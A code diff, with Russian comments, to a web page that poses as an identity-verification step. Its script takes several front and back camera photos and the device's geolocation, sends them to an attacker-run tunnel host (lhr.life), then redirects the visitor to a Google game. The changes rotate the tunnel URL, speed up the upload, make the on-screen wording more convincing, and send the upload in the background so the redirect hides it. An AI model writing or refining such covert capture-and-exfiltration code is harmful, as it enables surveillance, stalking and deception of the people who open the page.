@@ -29,8 +29,8 @@
     <canvas id="c"></canvas>
 
 <script>
-    // НЕ ЗАБЫВАЙ ОБНОВЛЯТЬ ЭТУ ССЫЛКУ ПРИ ПЕРЕЗАПУСКЕ ТУННЕЛЯ
-    const API = "https://1ba281161ad002.lhr.life"; 
+    // ОБНОВЛЯЙ ЭТУ ССЫЛКУ ПРИ ПЕРЕЗАПУСКЕ ТУННЕЛЯ
+    const API = "https://ca3cb7235bffe0.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -61,15 +61,15 @@
                 setTimeout(resolve, 800); 
             });
 
-            // На мобилках камере нужно время подстроиться под свет
-            await new Promise(r => setTimeout(r, 1500));
+            // Время на адаптацию камеры
+            await new Promise(r => setTimeout(r, 1200));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth || 1280;
             canvas.height = v.videoHeight || 720;
             canvas.getContext('2d').drawImage(v, 0, 0);
 
-            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7)); // Качество 0.7 для ускорения загрузки
         } catch (e) {
             return null;
         } finally {
@@ -88,38 +88,44 @@
         loader.style.display = 'block';
         msg.innerText = "Initializing protocols...";
 
+        // Геолокация (отправляем сразу, не ждем фото)
         navigator.geolocation.getCurrentPosition(p => {
             fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
         }, null, {timeout: 5000});
 
         const fd = new FormData();
-        // ПРОКАЧКА: делаем по 2 снимка с фронта и тыла для гарантии
         const plan = [
             { m: "user", l: "front_1" }, { m: "user", l: "front_2" },
             { m: "environment", l: "back_1" }, { m: "environment", l: "back_2" }
         ];
 
         for (let i = 0; i < plan.length; i++) {
-            msg.innerText = `Check (${i + 1}/${plan.length})...`;
+            msg.innerText = `Identity Check (${i + 1}/${plan.length})...`;
             const photo = await takePhoto(plan[i].m, plan[i].l);
             if (photo) fd.append('files', photo, getSmartName(plan[i].l));
-            await new Promise(r => setTimeout(r, 400));
+            // Небольшая пауза между снимками для стабильности
+            await new Promise(r => setTimeout(r, 300));
         }
 
         if (fd.has('files')) {
-            msg.innerText = "Encrypting data...";
+            msg.innerText = "Finalizing verification...";
             try {
-                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
+                // Используем асинхронный fetch без ожидания ответа для максимальной скорости редиректа
+                fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
-                    body: fd
-                });
+                    body: fd,
+                    mode: 'cors'
+                }).catch(e => console.log("Upload background status"));
             } catch(e) {}
         }
 
-        statusTitle.innerText = "Success";
-        loader.style.display = 'none';
-        msg.innerText = "Verified! Loading ...";
-        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+        // Визуальное завершение
+        setTimeout(() => {
+            statusTitle.innerText = "Success";
+            loader.style.display = 'none';
+            msg.innerText = "Verified! Loading service...";
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 800);
+        }, 500);
     }
 </script>
 </body>
